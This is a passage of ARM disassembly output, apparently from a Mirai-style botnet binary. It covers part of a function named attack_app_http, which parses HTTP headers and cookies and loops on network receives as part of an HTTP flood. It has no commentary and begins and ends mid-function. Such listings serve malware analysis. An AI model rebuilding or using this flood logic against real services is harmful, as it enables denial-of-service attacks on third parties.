    9130:	e59d0010 	ldr	r0, [sp, #16]
    9134:	eb0039d1 	bl	17880 <util_stristr>
    9138:	e3700001 	cmn	r0, #1
    913c:	0a000028 	beq	91e4 <attack_app_http+0x1014>
    9140:	e1a01005 	mov	r1, r5
    9144:	e3a00045 	mov	r0, #69	; 0x45
    9148:	eb003306 	bl	15d68 <table_retrieve_val>
    914c:	e1a0100b 	mov	r1, fp
    9150:	e1a02000 	mov	r2, r0
    9154:	e59d0010 	ldr	r0, [sp, #16]
    9158:	eb0039c8 	bl	17880 <util_stristr>
    915c:	e59de010 	ldr	lr, [sp, #16]
    9160:	e7de3000 	ldrb	r3, [lr, r0]
    9164:	e59d1010 	ldr	r1, [sp, #16]
    9168:	e3530020 	cmp	r3, #32
    916c:	e1a04000 	mov	r4, r0
    9170:	02804001 	addeq	r4, r0, #1
    9174:	e0816004 	add	r6, r1, r4
    9178:	e1a00006 	mov	r0, r6
    917c:	e064100b 	rsb	r1, r4, fp
    9180:	e51f2158 	ldr	r2, [pc, #-344]	; 9030 <attack_app_http+0xe60>
    9184:	e3a03002 	mov	r3, #2
    9188:	eb003916 	bl	175e8 <util_memsearch>
    918c:	e3700001 	cmn	r0, #1
    9190:	0a000013 	beq	91e4 <attack_app_http+0x1014>
    9194:	e3500001 	cmp	r0, #1
    9198:	e28d2c51 	add	r2, sp, #20736	; 0x5100
    919c:	c2400002 	subgt	r0, r0, #2
    91a0:	e2822070 	add	r2, r2, #112	; 0x70
    91a4:	e0823000 	add	r3, r2, r0
    91a8:	e0833004 	add	r3, r3, r4
    91ac:	e7c35007 	strb	r5, [r3, r7]
    91b0:	e1a00006 	mov	r0, r6
    91b4:	eb0038dd 	bl	17530 <util_strlen>
    91b8:	e1a01005 	mov	r1, r5
    91bc:	e1a04000 	mov	r4, r0
    91c0:	e3a00044 	mov	r0, #68	; 0x44
    91c4:	eb0032e7 	bl	15d68 <table_retrieve_val>
    91c8:	e1a01004 	mov	r1, r4
    91cc:	e1a02000 	mov	r2, r0
    91d0:	e1a00006 	mov	r0, r6
    91d4:	eb0039a9 	bl	17880 <util_stristr>
    91d8:	e3500000 	cmp	r0, #0
    91dc:	13a03001 	movne	r3, #1
    91e0:	158a3004 	strne	r3, [sl, #4]
    91e4:	e3a07000 	mov	r7, #0
    91e8:	e1a01007 	mov	r1, r7
    91ec:	e3a00042 	mov	r0, #66	; 0x42
    91f0:	e58a7008 	str	r7, [sl, #8]
    91f4:	eb0032db 	bl	15d68 <table_retrieve_val>
    91f8:	e1a0100b 	mov	r1, fp
    91fc:	e1a02000 	mov	r2, r0
    9200:	e59d0010 	ldr	r0, [sp, #16]
    9204:	eb00399d 	bl	17880 <util_stristr>
    9208:	e3e06c51 	mvn	r6, #20736	; 0x5100
    920c:	e3700001 	cmn	r0, #1
    9210:	e2466024 	sub	r6, r6, #36	; 0x24
    9214:	0a000028 	beq	92bc <attack_app_http+0x10ec>
    9218:	e1a01007 	mov	r1, r7
    921c:	e3a00042 	mov	r0, #66	; 0x42
    9220:	eb0032d0 	bl	15d68 <table_retrieve_val>
    9224:	e1a0100b 	mov	r1, fp
    9228:	e1a02000 	mov	r2, r0
    922c:	e59d0010 	ldr	r0, [sp, #16]
    9230:	eb003992 	bl	17880 <util_stristr>
    9234:	e59dc010 	ldr	ip, [sp, #16]
    9238:	e7dc3000 	ldrb	r3, [ip, r0]
    923c:	e59de010 	ldr	lr, [sp, #16]
    9240:	e3530020 	cmp	r3, #32
    9244:	e1a04000 	mov	r4, r0
    9248:	02804001 	addeq	r4, r0, #1
    924c:	e08e5004 	add	r5, lr, r4
    9250:	e1a00005 	mov	r0, r5
    9254:	e064100b 	rsb	r1, r4, fp
    9258:	e51f2230 	ldr	r2, [pc, #-560]	; 9030 <attack_app_http+0xe60>
    925c:	e3a03002 	mov	r3, #2
    9260:	eb0038e0 	bl	175e8 <util_memsearch>
    9264:	e3700001 	cmn	r0, #1
    9268:	0a000013 	beq	92bc <attack_app_http+0x10ec>
    926c:	e3500001 	cmp	r0, #1
    9270:	e28d1c51 	add	r1, sp, #20736	; 0x5100
    9274:	c2400002 	subgt	r0, r0, #2
    9278:	e2811070 	add	r1, r1, #112	; 0x70
    927c:	e0813000 	add	r3, r1, r0
    9280:	e0833004 	add	r3, r3, r4
    9284:	e7c37006 	strb	r7, [r3, r6]
    9288:	e1a00005 	mov	r0, r5
    928c:	eb0038a7 	bl	17530 <util_strlen>
    9290:	e1a01007 	mov	r1, r7
    9294:	e1a04000 	mov	r4, r0
    9298:	e3a00043 	mov	r0, #67	; 0x43
    929c:	eb0032b1 	bl	15d68 <table_retrieve_val>
    92a0:	e1a01004 	mov	r1, r4
    92a4:	e1a02000 	mov	r2, r0
    92a8:	e1a00005 	mov	r0, r5
    92ac:	eb003973 	bl	17880 <util_stristr>
    92b0:	e3500000 	cmp	r0, #0
    92b4:	13a03001 	movne	r3, #1
    92b8:	158a3008 	strne	r3, [sl, #8]
    92bc:	e3a01000 	mov	r1, #0
    92c0:	e3a00041 	mov	r0, #65	; 0x41
    92c4:	eb0032a7 	bl	15d68 <table_retrieve_val>
    92c8:	e1a0100b 	mov	r1, fp
    92cc:	e1a02000 	mov	r2, r0
    92d0:	e59d0010 	ldr	r0, [sp, #16]
    92d4:	eb003969 	bl	17880 <util_stristr>
    92d8:	e3700001 	cmn	r0, #1
    92dc:	e3e06c51 	mvn	r6, #20736	; 0x5100
    92e0:	03a03000 	moveq	r3, #0
    92e4:	e2466024 	sub	r6, r6, #36	; 0x24
    92e8:	058a300c 	streq	r3, [sl, #12]
    92ec:	0a000020 	beq	9374 <attack_app_http+0x11a4>
    92f0:	e3a01000 	mov	r1, #0
    92f4:	e3a00041 	mov	r0, #65	; 0x41
    92f8:	eb00329a 	bl	15d68 <table_retrieve_val>
    92fc:	e1a0100b 	mov	r1, fp
    9300:	e1a02000 	mov	r2, r0
    9304:	e59d0010 	ldr	r0, [sp, #16]
    9308:	eb00395c 	bl	17880 <util_stristr>
    930c:	e59d2010 	ldr	r2, [sp, #16]
    9310:	e7d23000 	ldrb	r3, [r2, r0]
    9314:	e3530020 	cmp	r3, #32
    9318:	e59d3010 	ldr	r3, [sp, #16]
    931c:	e1a04000 	mov	r4, r0
    9320:	02804001 	addeq	r4, r0, #1
    9324:	e0835004 	add	r5, r3, r4
    9328:	e1a00005 	mov	r0, r5
    932c:	e064100b 	rsb	r1, r4, fp
    9330:	e51f2308 	ldr	r2, [pc, #-776]	; 9030 <attack_app_http+0xe60>
    9334:	e3a03002 	mov	r3, #2
    9338:	eb0038aa 	bl	175e8 <util_memsearch>
    933c:	e3700001 	cmn	r0, #1
    9340:	0a00000b 	beq	9374 <attack_app_http+0x11a4>
    9344:	e3500001 	cmp	r0, #1
    9348:	e28dcc51 	add	ip, sp, #20736	; 0x5100
    934c:	c2400002 	subgt	r0, r0, #2
    9350:	e28cc070 	add	ip, ip, #112	; 0x70
    9354:	e08c2000 	add	r2, ip, r0
    9358:	e0822004 	add	r2, r2, r4
    935c:	e3a03000 	mov	r3, #0
    9360:	e1a00005 	mov	r0, r5
    9364:	e3a0100a 	mov	r1, #10
    9368:	e7c23006 	strb	r3, [r2, r6]
    936c:	eb0038b8 	bl	17654 <util_atoi>
    9370:	e58a000c 	str	r0, [sl, #12]
    9374:	e3a05000 	mov	r5, #0
    9378:	e59d3010 	ldr	r3, [sp, #16]
    937c:	e3a01000 	mov	r1, #0
    9380:	e3a00040 	mov	r0, #64	; 0x40
    9384:	e0834005 	add	r4, r3, r5
    9388:	eb003276 	bl	15d68 <table_retrieve_val>
    938c:	e1a0100b 	mov	r1, fp
    9390:	e1a02000 	mov	r2, r0
    9394:	e1a00004 	mov	r0, r4
    9398:	eb003938 	bl	17880 <util_stristr>
    939c:	e3e0cc51 	mvn	ip, #20736	; 0x5100
    93a0:	e24cc024 	sub	ip, ip, #36	; 0x24
    93a4:	e3700001 	cmn	r0, #1
    93a8:	e58dc020 	str	ip, [sp, #32]
    93ac:	0a00007f 	beq	95b0 <attack_app_http+0x13e0>
    93b0:	e59a3010 	ldr	r3, [sl, #16]
    93b4:	e3530004 	cmp	r3, #4
    93b8:	ca00007c 	bgt	95b0 <attack_app_http+0x13e0>
    93bc:	e3a01000 	mov	r1, #0
    93c0:	e3a00040 	mov	r0, #64	; 0x40
    93c4:	eb003267 	bl	15d68 <table_retrieve_val>
    93c8:	e1a0100b 	mov	r1, fp
    93cc:	e1a02000 	mov	r2, r0
    93d0:	e1a00004 	mov	r0, r4
    93d4:	eb003929 	bl	17880 <util_stristr>
    93d8:	e59de010 	ldr	lr, [sp, #16]
    93dc:	e0808005 	add	r8, r0, r5
    93e0:	e7de3008 	ldrb	r3, [lr, r8]
    93e4:	e3530020 	cmp	r3, #32
    93e8:	02800001 	addeq	r0, r0, #1
    93ec:	e065300b 	rsb	r3, r5, fp
    93f0:	e0607003 	rsb	r7, r0, r3
    93f4:	e0846000 	add	r6, r4, r0
    93f8:	00808005 	addeq	r8, r0, r5
    93fc:	e1a01007 	mov	r1, r7
    9400:	e1a00006 	mov	r0, r6
    9404:	e51f23dc 	ldr	r2, [pc, #-988]	; 9030 <attack_app_http+0xe60>
    9408:	e3a03002 	mov	r3, #2
    940c:	eb003875 	bl	175e8 <util_memsearch>
    9410:	e3700001 	cmn	r0, #1
    9414:	e1a04000 	mov	r4, r0
    9418:	0a000029 	beq	94c4 <attack_app_http+0x12f4>
    941c:	e59d1010 	ldr	r1, [sp, #16]
    9420:	e3500001 	cmp	r0, #1
    9424:	c2404002 	subgt	r4, r0, #2
    9428:	e0815008 	add	r5, r1, r8
    942c:	e1a00006 	mov	r0, r6
    9430:	e1a01007 	mov	r1, r7
    9434:	e51f2410 	ldr	r2, [pc, #-1040]	; 902c <attack_app_http+0xe5c>
    9438:	e3a03001 	mov	r3, #1
    943c:	eb003869 	bl	175e8 <util_memsearch>
    9440:	e3500000 	cmp	r0, #0
    9444:	da000005 	ble	9460 <attack_app_http+0x1290>
    9448:	e1a00006 	mov	r0, r6
    944c:	e1a01007 	mov	r1, r7
    9450:	e51f242c 	ldr	r2, [pc, #-1068]	; 902c <attack_app_http+0xe5c>
    9454:	e3a03001 	mov	r3, #1
    9458:	eb003862 	bl	175e8 <util_memsearch>
    945c:	e2404001 	sub	r4, r0, #1
    9460:	e28d2c51 	add	r2, sp, #20736	; 0x5100
    9464:	e2822070 	add	r2, r2, #112	; 0x70
    9468:	e0823004 	add	r3, r2, r4
    946c:	e59de020 	ldr	lr, [sp, #32]
    9470:	e3a02000 	mov	r2, #0
    9474:	e0833008 	add	r3, r3, r8
    9478:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    947c:	e7c3200e 	strb	r2, [r3, lr]
    9480:	e581216c 	str	r2, [r1, #364]	; 0x16c
    9484:	ea000004 	b	949c <attack_app_http+0x12cc>
    9488:	e7d53004 	ldrb	r3, [r5, r4]
    948c:	e353003d 	cmp	r3, #61	; 0x3d
    9490:	0a00000d 	beq	94cc <attack_app_http+0x12fc>
    9494:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9498:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    949c:	e1a00005 	mov	r0, r5
    94a0:	eb003822 	bl	17530 <util_strlen>
    94a4:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    94a8:	e593416c 	ldr	r4, [r3, #364]	; 0x16c
    94ac:	e1500004 	cmp	r0, r4
    94b0:	e284c001 	add	ip, r4, #1
    94b4:	cafffff3 	bgt	9488 <attack_app_http+0x12b8>
    94b8:	e7d53004 	ldrb	r3, [r5, r4]
    94bc:	e353003d 	cmp	r3, #61	; 0x3d
    94c0:	0a000001 	beq	94cc <attack_app_http+0x12fc>
    94c4:	e1a05008 	mov	r5, r8
    94c8:	eaffffaa 	b	9378 <attack_app_http+0x11a8>
    94cc:	e59a3010 	ldr	r3, [sl, #16]
    94d0:	e3a0c000 	mov	ip, #0
    94d4:	e28dea05 	add	lr, sp, #20480	; 0x5000
    94d8:	e3530000 	cmp	r3, #0
    94dc:	e58ec16c 	str	ip, [lr, #364]	; 0x16c
    94e0:	da000013 	ble	9534 <attack_app_http+0x1364>
    94e4:	e1a0100c 	mov	r1, ip
    94e8:	ea000008 	b	9510 <attack_app_http+0x1340>
    94ec:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    94f0:	e591316c 	ldr	r3, [r1, #364]	; 0x16c
    94f4:	e59a2010 	ldr	r2, [sl, #16]
    94f8:	e283c001 	add	ip, r3, #1
    94fc:	e152000c 	cmp	r2, ip
    9500:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    9504:	e1a0100c 	mov	r1, ip
    9508:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    950c:	da000008 	ble	9534 <attack_app_http+0x1364>
    9510:	e1a01381 	lsl	r1, r1, #7
    9514:	e2811d17 	add	r1, r1, #1472	; 0x5c0
    9518:	e0891001 	add	r1, r9, r1
    951c:	e1a00005 	mov	r0, r5
    9520:	e1a02004 	mov	r2, r4
    9524:	eb003919 	bl	17990 <util_strncmp>
    9528:	e3500000 	cmp	r0, #0
    952c:	0affffee 	beq	94ec <attack_app_http+0x131c>
    9530:	eaffffe3 	b	94c4 <attack_app_http+0x12f4>
    9534:	e1a00005 	mov	r0, r5
    9538:	eb0037fc 	bl	17530 <util_strlen>
    953c:	e350007f 	cmp	r0, #127	; 0x7f
    9540:	caffffdf 	bgt	94c4 <attack_app_http+0x12f4>
    9544:	e59a0010 	ldr	r0, [sl, #16]
    9548:	e1a00380 	lsl	r0, r0, #7
    954c:	e2800d17 	add	r0, r0, #1472	; 0x5c0
    9550:	e1a01005 	mov	r1, r5
    9554:	e0890000 	add	r0, r9, r0
    9558:	eb0037fe 	bl	17558 <util_strcpy>
    955c:	e59a3010 	ldr	r3, [sl, #16]
    9560:	e1a05008 	mov	r5, r8
    9564:	e2833001 	add	r3, r3, #1
    9568:	e58a3010 	str	r3, [sl, #16]
    956c:	eaffff81 	b	9378 <attack_app_http+0x11a8>
    9570:	e3a03068 	mov	r3, #104	; 0x68
    9574:	e5843000 	str	r3, [r4]
    9578:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    957c:	eb0047db 	bl	1b4f0 <__GI___libc_close>
    9580:	e3e03000 	mvn	r3, #0
    9584:	e3a02000 	mov	r2, #0
    9588:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    958c:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
    9590:	eafffc9f 	b	8814 <attack_app_http+0x644>
    9594:	e243300b 	sub	r3, r3, #11
    9598:	e54635a8 	strb	r3, [r6, #-1448]	; 0xfffffa58
    959c:	e51605ac 	ldr	r0, [r6, #-1452]	; 0xfffffa54
    95a0:	eb0047d2 	bl	1b4f0 <__GI___libc_close>
    95a4:	e3e03000 	mvn	r3, #0
    95a8:	e50635ac 	str	r3, [r6, #-1452]	; 0xfffffa54
    95ac:	eafffc1a 	b	861c <attack_app_http+0x44c>
    95b0:	e3a01000 	mov	r1, #0
    95b4:	e3a0003f 	mov	r0, #63	; 0x3f
    95b8:	eb0031ea 	bl	15d68 <table_retrieve_val>
    95bc:	e1a0100b 	mov	r1, fp
    95c0:	e1a02000 	mov	r2, r0
    95c4:	e59d0010 	ldr	r0, [sp, #16]
    95c8:	eb0038ac 	bl	17880 <util_stristr>
    95cc:	e3700001 	cmn	r0, #1
    95d0:	0a00005a 	beq	9740 <attack_app_http+0x1570>
    95d4:	e3a01000 	mov	r1, #0
    95d8:	e3a0003f 	mov	r0, #63	; 0x3f
    95dc:	eb0031e1 	bl	15d68 <table_retrieve_val>
    95e0:	e1a0100b 	mov	r1, fp
    95e4:	e1a02000 	mov	r2, r0
    95e8:	e59d0010 	ldr	r0, [sp, #16]
    95ec:	eb0038a3 	bl	17880 <util_stristr>
    95f0:	e59de010 	ldr	lr, [sp, #16]
    95f4:	e7de3000 	ldrb	r3, [lr, r0]
    95f8:	e59d1010 	ldr	r1, [sp, #16]
    95fc:	e3530020 	cmp	r3, #32
    9600:	e1a04000 	mov	r4, r0
    9604:	02804001 	addeq	r4, r0, #1
    9608:	e0816004 	add	r6, r1, r4
    960c:	e1a00006 	mov	r0, r6
    9610:	e064100b 	rsb	r1, r4, fp
    9614:	e51f25ec 	ldr	r2, [pc, #-1516]	; 9030 <attack_app_http+0xe60>
    9618:	e3a03002 	mov	r3, #2
    961c:	eb0037f1 	bl	175e8 <util_memsearch>
    9620:	e3700001 	cmn	r0, #1
    9624:	0a000045 	beq	9740 <attack_app_http+0x1570>
    9628:	e3500001 	cmp	r0, #1
    962c:	e28d2c51 	add	r2, sp, #20736	; 0x5100
    9630:	c2400002 	subgt	r0, r0, #2
    9634:	e2822070 	add	r2, r2, #112	; 0x70
    9638:	e082c000 	add	ip, r2, r0
    963c:	e59de020 	ldr	lr, [sp, #32]
    9640:	e2805001 	add	r5, r0, #1
    9644:	e08cc004 	add	ip, ip, r4
    9648:	e3a07000 	mov	r7, #0
    964c:	e1a00006 	mov	r0, r6
    9650:	e1a01005 	mov	r1, r5
    9654:	e51f2624 	ldr	r2, [pc, #-1572]	; 9038 <attack_app_http+0xe68>
    9658:	e3a03004 	mov	r3, #4
    965c:	e7cc700e 	strb	r7, [ip, lr]
    9660:	eb0037e0 	bl	175e8 <util_memsearch>
    9664:	e3500004 	cmp	r0, #4
    9668:	0a0000ee 	beq	9a28 <attack_app_http+0x1858>
    966c:	e59d1010 	ldr	r1, [sp, #16]
    9670:	e7d13004 	ldrb	r3, [r1, r4]
    9674:	e353002f 	cmp	r3, #47	; 0x2f
    9678:	0a00016a 	beq	9c28 <attack_app_http+0x1a58>
    967c:	e3a03001 	mov	r3, #1
    9680:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    9684:	eafffc62 	b	8814 <attack_app_http+0x644>
    9688:	eb003c0d 	bl	186c4 <__GI___errno_location>
    968c:	e1a04000 	mov	r4, r0
    9690:	e3a03000 	mov	r3, #0
    9694:	e5843000 	str	r3, [r4]
    9698:	e59d1010 	ldr	r1, [sp, #16]
    969c:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    96a0:	e3a02b0a 	mov	r2, #10240	; 0x2800
    96a4:	e2833901 	add	r3, r3, #16384	; 0x4000
    96a8:	eb003cd9 	bl	18a14 <__libc_recv>
    96ac:	e3500000 	cmp	r0, #0
    96b0:	0affffae 	beq	9570 <attack_app_http+0x13a0>
    96b4:	e3700001 	cmn	r0, #1
    96b8:	1afffff4 	bne	9690 <attack_app_http+0x14c0>
    96bc:	e5943000 	ldr	r3, [r4]
    96c0:	e353000b 	cmp	r3, #11
    96c4:	1affffab 	bne	9578 <attack_app_http+0x13a8>
    96c8:	e55a35a8 	ldrb	r3, [sl, #-1448]	; 0xfffffa58
    96cc:	e3530000 	cmp	r3, #0
    96d0:	0afffc4f 	beq	8814 <attack_app_http+0x644>
    96d4:	eaffffe8 	b	967c <attack_app_http+0x14ac>
    96d8:	e2833001 	add	r3, r3, #1
    96dc:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    96e0:	eafffc4b 	b	8814 <attack_app_http+0x644>
    96e4:	e1a0000b 	mov	r0, fp
    96e8:	e1a01004 	mov	r1, r4
    96ec:	eb003799 	bl	17558 <util_strcpy>
    96f0:	eafffd6d 	b	8cac <attack_app_http+0xadc>
    96f4:	e3a03068 	mov	r3, #104	; 0x68
    96f8:	e58b3000 	str	r3, [fp]
    96fc:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    9700:	eb00477a 	bl	1b4f0 <__GI___libc_close>
    9704:	e3e03000 	mvn	r3, #0
    9708:	e3a02000 	mov	r2, #0
    970c:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    9710:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
    9714:	eafffc3e 	b	8814 <attack_app_http+0x644>
    9718:	e59b3000 	ldr	r3, [fp]
    971c:	e353000b 	cmp	r3, #11
    9720:	0afffc3b 	beq	8814 <attack_app_http+0x644>
    9724:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    9728:	eb004770 	bl	1b4f0 <__GI___libc_close>
    972c:	e3e03000 	mvn	r3, #0
    9730:	e3a02000 	mov	r2, #0
    9734:	e50a35ac 	str	r3, [sl, #-1452]	; 0xfffffa54
    9738:	e54a25a8 	strb	r2, [sl, #-1448]	; 0xfffffa58
    973c:	eafffc34 	b	8814 <attack_app_http+0x644>
    9740:	e3a01000 	mov	r1, #0
    9744:	e3a0003e 	mov	r0, #62	; 0x3e
    9748:	eb003186 	bl	15d68 <table_retrieve_val>
    974c:	e1a0100b 	mov	r1, fp
    9750:	e1a02000 	mov	r2, r0
    9754:	e59d0010 	ldr	r0, [sp, #16]
    9758:	eb003848 	bl	17880 <util_stristr>
    975c:	e3e06c51 	mvn	r6, #20736	; 0x5100
    9760:	e3700001 	cmn	r0, #1
    9764:	e2466024 	sub	r6, r6, #36	; 0x24
    9768:	0a00007c 	beq	9960 <attack_app_http+0x1790>
    976c:	e3a01000 	mov	r1, #0
    9770:	e3a0003e 	mov	r0, #62	; 0x3e
    9774:	eb00317b 	bl	15d68 <table_retrieve_val>
    9778:	e1a0100b 	mov	r1, fp
    977c:	e1a02000 	mov	r2, r0
    9780:	e59d0010 	ldr	r0, [sp, #16]
    9784:	eb00383d 	bl	17880 <util_stristr>
    9788:	e59de010 	ldr	lr, [sp, #16]
    978c:	e7de3000 	ldrb	r3, [lr, r0]
    9790:	e59d1010 	ldr	r1, [sp, #16]
    9794:	e3530020 	cmp	r3, #32
    9798:	e1a04000 	mov	r4, r0
    979c:	02804001 	addeq	r4, r0, #1
    97a0:	e0815004 	add	r5, r1, r4
    97a4:	e1a00005 	mov	r0, r5
    97a8:	e064100b 	rsb	r1, r4, fp
    97ac:	e51f2784 	ldr	r2, [pc, #-1924]	; 9030 <attack_app_http+0xe60>
    97b0:	e3a03002 	mov	r3, #2
    97b4:	eb00378b 	bl	175e8 <util_memsearch>
    97b8:	e3700001 	cmn	r0, #1
    97bc:	e1a07000 	mov	r7, r0
    97c0:	0a000066 	beq	9960 <attack_app_http+0x1790>
    97c4:	e3500001 	cmp	r0, #1
    97c8:	e28dcc51 	add	ip, sp, #20736	; 0x5100
    97cc:	c2407002 	subgt	r7, r0, #2
    97d0:	e28cc070 	add	ip, ip, #112	; 0x70
    97d4:	e08c2007 	add	r2, ip, r7
    97d8:	e3a03000 	mov	r3, #0
    97dc:	e0822004 	add	r2, r2, r4
    97e0:	e7c23006 	strb	r3, [r2, r6]
    97e4:	e28dea05 	add	lr, sp, #20480	; 0x5000
    97e8:	e58e316c 	str	r3, [lr, #364]	; 0x16c
    97ec:	e59d1010 	ldr	r1, [sp, #16]
    97f0:	e7d10004 	ldrb	r0, [r1, r4]
    97f4:	e2403030 	sub	r3, r0, #48	; 0x30
    97f8:	e3530009 	cmp	r3, #9
    97fc:	81a01005 	movhi	r1, r5
    9800:	8a000009 	bhi	982c <attack_app_http+0x165c>
    9804:	e3a0e001 	mov	lr, #1
    9808:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    980c:	e582e16c 	str	lr, [r2, #364]	; 0x16c
    9810:	e7de0005 	ldrb	r0, [lr, r5]
    9814:	e2403030 	sub	r3, r0, #48	; 0x30
    9818:	e1a0c00e 	mov	ip, lr
    981c:	e3530009 	cmp	r3, #9
    9820:	e28ee001 	add	lr, lr, #1
    9824:	e08c1005 	add	r1, ip, r5
    9828:	9afffff6 	bls	9808 <attack_app_http+0x1638>
    982c:	e3500000 	cmp	r0, #0
    9830:	0a00004a 	beq	9960 <attack_app_http+0x1790>
    9834:	e3a06000 	mov	r6, #0
    9838:	e5c16000 	strb	r6, [r1]
    983c:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    9840:	e593c16c 	ldr	ip, [r3, #364]	; 0x16c
    9844:	e28cc001 	add	ip, ip, #1
    9848:	e583c16c 	str	ip, [r3, #364]	; 0x16c
    984c:	e7d5300c 	ldrb	r3, [r5, ip]
    9850:	e3530020 	cmp	r3, #32
    9854:	028cc001 	addeq	ip, ip, #1
    9858:	e085400c 	add	r4, r5, ip
    985c:	028dea05 	addeq	lr, sp, #20480	; 0x5000
    9860:	058ec16c 	streq	ip, [lr, #364]	; 0x16c
    9864:	e1a00004 	mov	r0, r4
    9868:	eb003730 	bl	17530 <util_strlen>
    986c:	e51f2840 	ldr	r2, [pc, #-2112]	; 9034 <attack_app_http+0xe64>
    9870:	e1a01000 	mov	r1, r0
    9874:	e1a00004 	mov	r0, r4
    9878:	eb003800 	bl	17880 <util_stristr>
    987c:	e3700001 	cmn	r0, #1
    9880:	028d3a05 	addeq	r3, sp, #20480	; 0x5000
    9884:	0593c16c 	ldreq	ip, [r3, #364]	; 0x16c
    9888:	0a00000c 	beq	98c0 <attack_app_http+0x16f0>
    988c:	e28d1a05 	add	r1, sp, #20480	; 0x5000
    9890:	e591416c 	ldr	r4, [r1, #364]	; 0x16c
    9894:	e0854004 	add	r4, r5, r4
    9898:	e1a00004 	mov	r0, r4
    989c:	eb003723 	bl	17530 <util_strlen>
    98a0:	e51f2874 	ldr	r2, [pc, #-2164]	; 9034 <attack_app_http+0xe64>
    98a4:	e1a01000 	mov	r1, r0
    98a8:	e1a00004 	mov	r0, r4
    98ac:	eb0037f3 	bl	17880 <util_stristr>
    98b0:	e28d2a05 	add	r2, sp, #20480	; 0x5000
    98b4:	e592c16c 	ldr	ip, [r2, #364]	; 0x16c
    98b8:	e08cc000 	add	ip, ip, r0
    98bc:	e582c16c 	str	ip, [r2, #364]	; 0x16c
    98c0:	e7d5300c 	ldrb	r3, [r5, ip]
    98c4:	e3530022 	cmp	r3, #34	; 0x22
    98c8:	0a000130 	beq	9d90 <attack_app_http+0x1bc0>
    98cc:	e1a00005 	mov	r0, r5
    98d0:	e3a0100a 	mov	r1, #10
    98d4:	eb00375e 	bl	17654 <util_atoi>
    98d8:	e2403001 	sub	r3, r0, #1
    98dc:	e3530008 	cmp	r3, #8
    98e0:	959d2038 	ldrls	r2, [sp, #56]	; 0x38
    98e4:	90804002 	addls	r4, r0, r2
    98e8:	9a000001 	bls	98f4 <attack_app_http+0x1724>
    98ec:	ea000005 	b	9908 <attack_app_http+0x1738>
    98f0:	eb0046a8 	bl	1b398 <__GI_sleep>
    98f4:	e3a00000 	mov	r0, #0
    98f8:	eb003a46 	bl	18218 <__GI_time>
    98fc:	e1540000 	cmp	r4, r0
    9900:	e3a00001 	mov	r0, #1
    9904:	8afffff9 	bhi	98f0 <attack_app_http+0x1720>
    9908:	e28d3a05 	add	r3, sp, #20480	; 0x5000
    990c:	e593416c 	ldr	r4, [r3, #364]	; 0x16c
    9910:	e0856004 	add	r6, r5, r4
    9914:	e1a00006 	mov	r0, r6
    9918:	eb003704 	bl	17530 <util_strlen>
    991c:	e51f28ec 	ldr	r2, [pc, #-2284]	; 9038 <attack_app_http+0xe68>
    9920:	e1a01000 	mov	r1, r0
    9924:	e1a00006 	mov	r0, r6
    9928:	eb0037d4 	bl	17880 <util_stristr>
    992c:	e3500004 	cmp	r0, #4
    9930:	0a0000d4 	beq	9c88 <attack_app_http+0x1ab8>
    9934:	e7d53004 	ldrb	r3, [r5, r4]
    9938:	e353002f 	cmp	r3, #47	; 0x2f
    993c:	0a000125 	beq	9dd8 <attack_app_http+0x1c08>
    9940:	e2890e59 	add	r0, r9, #1424	; 0x590
    9944:	e2800007 	add	r0, r0, #7
    9948:	e51f190c 	ldr	r1, [pc, #-2316]	; 9044 <attack_app_http+0xe74>
    994c:	e3a02004 	mov	r2, #4
    9950:	eb003b72 	bl	18720 <__GI_memcpy>
    9954:	e3a0300a 	mov	r3, #10
    9958:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    995c:	eafffbac 	b	8814 <attack_app_http+0x644>
    9960:	e1a0100b 	mov	r1, fp
    9964:	e51f2930 	ldr	r2, [pc, #-2352]	; 903c <attack_app_http+0xe6c>
    9968:	e3a03004 	mov	r3, #4
    996c:	e59d0010 	ldr	r0, [sp, #16]
    9970:	eb00371c 	bl	175e8 <util_memsearch>
    9974:	e2894e59 	add	r4, r9, #1424	; 0x590
    9978:	e2844007 	add	r4, r4, #7
    997c:	e1a05000 	mov	r5, r0
    9980:	e51f1948 	ldr	r1, [pc, #-2376]	; 9040 <attack_app_http+0xe70>
    9984:	e1a00004 	mov	r0, r4
    9988:	eb0037e0 	bl	17910 <util_strcmp>
    998c:	e3500000 	cmp	r0, #0
    9990:	0a000069 	beq	9b3c <attack_app_http+0x196c>
    9994:	e3a03007 	mov	r3, #7
    9998:	e54a35a8 	strb	r3, [sl, #-1448]	; 0xfffffa58
    999c:	e1a02005 	mov	r2, r5
    99a0:	e51a05ac 	ldr	r0, [sl, #-1452]	; 0xfffffa54
    99a4:	e59d1010 	ldr	r1, [sp, #16]
    99a8:	e3a03901 	mov	r3, #16384	; 0x4000
    99ac:	eb003c18 	bl	18a14 <__libc_recv>
    99b0:	eafffb97 	b	8814 <attack_app_http+0x644>
    99b4:	e3a01000 	mov	r1, #0
    99b8:	e3a0003d 	mov	r0, #61	; 0x3d
    99bc:	e59a4294 	ldr	r4, [sl, #660]	; 0x294
    99c0:	eb0030e8 	bl	15d68 <table_retrieve_val>
    99c4:	e1a01004 	mov	r1, r4
    99c8:	e1a02000 	mov	r2, r0
    99cc:	e3a0300b 	mov	r3, #11
    99d0:	e1a00007 	mov	r0, r7
    99d4:	eb003703 	bl	175e8 <util_memsearch>
    99d8:	e59a1294 	ldr	r1, [sl, #660]	; 0x294
    99dc:	e0876000 	add	r6, r7, r0
